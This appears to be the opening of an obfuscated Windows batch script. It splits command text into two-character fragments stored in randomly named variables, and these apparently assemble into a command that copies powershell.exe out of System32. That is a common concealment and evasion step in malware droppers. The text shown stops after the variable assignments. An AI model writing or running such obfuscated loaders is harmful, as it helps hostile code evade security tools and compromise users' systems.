@echo off
set "aITAkiIXFA=po"
set "qNJuAJDXsp=.e"
set "XqfViVpslR=rs"
set "APUNckJblO=st"
set "ZpzKWQGmDS=\v"
set "SpLOuPBsNF=xe"
set "pMJPcdNMNV=ws"
set "CeZhyeKmjy=0\"
set "qRyVIMgOYn=ow"
set "cWWCCmalKH=Sy"
set "KVrGTYGtfk=ll"
set "RDMCsIYLGk= C"
set "DOECbtVWsv=32"
set "YNisnnURlj=rS"
set "AAzxRreymc=we"
set "DuREeLkrLI=do"
set "biXTAfFcOe=Wi"
set "HqKiPjIGPe=nd"
set "ZRdBeIIGuf=em"
set "xzoPwvIzxP=py"
set "xhHCqPPayf=he"
set "ZEHnnlTuxU=in"
set "ZYHeOJGTcm=s\"
set "DKtzQiwJRt=:\"
set "LVdrNjeUbD=\W"
set "gtceSvvEUk=he"
